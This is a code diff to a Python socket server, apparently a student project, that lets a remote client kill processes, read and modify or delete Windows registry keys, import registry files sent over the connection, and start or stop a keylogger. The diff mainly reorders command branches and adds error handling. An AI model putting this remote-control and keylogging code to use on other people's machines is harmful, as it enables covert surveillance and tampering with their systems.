@@ -82,6 +82,7 @@ class Server(object):
                 if not data:
                     break
                 self.conn.sendall(data)
+            send.close()
         
         elif Str.decode() == 'SHWPRC':
             #Commands the server to send the file consisting of running processes
@@ -106,25 +107,6 @@ class Server(object):
             arr = Str.decode().split(' ')
             brr = arr[1].split('\\',1)
             self.conn.send(str(registry.getValue(mp[brr[0]],brr[1],arr[2])).encode())
-        elif Str.decode().find('DELETEVALUE')!=-1:
-            arr = Str.decode().split(' ')
-            brr = arr[1].split('\\',1)
-            if registry.deleteValue(mp[brr[0]],brr[1],arr[2]):
-                self.conn.send('Completed'.encode())
-            else:
-                self.conn.send('Failure'.encode())
-        elif Str.decode().find('CREATEKEY')!=-1:
-            arr = Str.decode().split(' ')
-            if registry.createKey(arr[1])==True:
-                self.conn.send('Completed'.encode())
-            else:
-                self.conn.send('Failure'.encode())
-        elif Str.decode().find('DELETEKEY')!=-1:
-            arr = Str.decode().split(' ')
-            if registry.deleteKey(arr[1])==True:
-                self.conn.send('Completed'.encode())
-            else:
-                self.conn.send('Failed'.encode())
         elif Str.decode().find('SETVALUE')!=-1:
             arr = Str.decode().split('%')
             brr = arr[1].split('\\',1)
@@ -135,6 +117,26 @@ class Server(object):
                     self.conn.send('Failed'.encode())
             except:
                 self.conn.send('Failed'.encode())
+        elif Str.decode().find('DELETEVALUE')!=-1:
+            arr = Str.decode().split(' ')
+            brr = arr[1].split('\\',1)
+            if registry.deleteValue(mp[brr[0]],brr[1],arr[2]):
+                self.conn.send('Completed'.encode())
+            else:
+                self.conn.send('Failed'.encode())
+        elif Str.decode().find('CREATEKEY')!=-1:
+            arr = Str.decode().split(' ')
+            if registry.createKey(arr[1])==True:
+                self.conn.send('Completed'.encode())
+            else:
+                self.conn.send('Failed'.encode())
+        elif Str.decode().find('DELETEKEY')!=-1:
+            arr = Str.decode().split(' ')
+            if registry.deleteKey(arr[1])==True:
+                self.conn.send('Completed'.encode())
+            else:
+                self.conn.send('Failed'.encode())
+        
         elif Str.decode().find('KILLAPP') != -1:
             name = str(Str.decode().split()[1])
             try:
@@ -144,8 +146,8 @@ class Server(object):
                 self.conn.send('FALSE'.encode())
                 pass
         elif Str.decode().find('KILL') != -1:
-            PID = int(Str.decode().split()[1])
             try:
+                PID = int(Str.decode().split()[1])
                 os.kill(PID, 9)
                 self.conn.send('TRUE'.encode())
             except:
@@ -164,12 +166,15 @@ class Server(object):
         elif Str.decode() == 'KEYSTOP':
             self.stopKeylogging()
         else:
-            f_bin=open('testing.reg','wb+')
+            f_bin=open(r'testing.reg','wb+')
             f_bin.write(Str)
             f_bin.close()
             if len(Str)<1024:
-                registry.importRegistry(filepath=r'E:\Python\Socket_Midterm\testing.reg')
-                
+                try:
+                    registry.importRegistry(filepath=r'testing.reg')
+                    self.conn.send('Completed'.encode())
+                except:
+                    self.conn.send('Failed'.encode())
 
     #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
     __interval = 5
